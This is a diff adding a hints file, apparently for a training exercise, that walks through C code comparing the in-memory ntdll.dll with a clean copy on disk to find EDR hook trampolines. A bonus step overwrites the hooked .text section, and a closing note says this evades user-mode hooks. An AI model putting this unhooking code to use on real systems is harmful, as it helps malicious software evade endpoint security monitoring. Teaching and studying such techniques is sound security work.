@@ -1,0 +1,35 @@
+=== HINT 1: Get in-memory ntdll ===
+HMODULE mem_ntdll = GetModuleHandleA("ntdll.dll");
+
+=== HINT 2: Map disk copy ===
+char path[MAX_PATH];
+GetSystemDirectoryA(path, MAX_PATH);
+strcat_s(path, MAX_PATH, "\\ntdll.dll");
+HANDLE hFile    = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
+                               OPEN_EXISTING, 0, NULL);
+HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+PVOID  disk_ntdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+
+=== HINT 3: Find .text section ===
+// Use find_section() helper already in the exercise file
+PIMAGE_SECTION_HEADER mem_text  = find_section(mem_ntdll,  ".text");
+PIMAGE_SECTION_HEADER disk_text = find_section(disk_ntdll, ".text");
+
+=== HINT 4: Compare bytes ===
+BYTE *mem_bytes  = (BYTE*)mem_ntdll  + mem_text->VirtualAddress;
+BYTE *disk_bytes = (BYTE*)disk_ntdll + disk_text->PointerToRawData;
+// Compare first N bytes for hook signatures (JMP/CALL opcode = E9/FF)
+
+=== BONUS: Unhook ===
+DWORD old;
+VirtualProtect(mem_bytes, mem_text->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old);
+memcpy(mem_bytes, disk_bytes, mem_text->Misc.VirtualSize);
+VirtualProtect(mem_bytes, mem_text->Misc.VirtualSize, old, &old);
+
+=== KEY INSIGHT ===
+EDR hooks look like: E9 XX XX XX XX (JMP rel32) at the start of syscall stubs.
+The first 4-8 bytes of NtAllocateVirtualMemory etc. are overwritten with a trampoline
+that redirects to the EDR's inspection code before invoking the real syscall.
+Unhooking by mapping a clean copy evades user-mode hooks entirely.
+Kernel callbacks (PsSetCreateProcessNotifyRoutine, minifilters) are unaffected -
+they live in kernel space and cannot be patched from user mode.
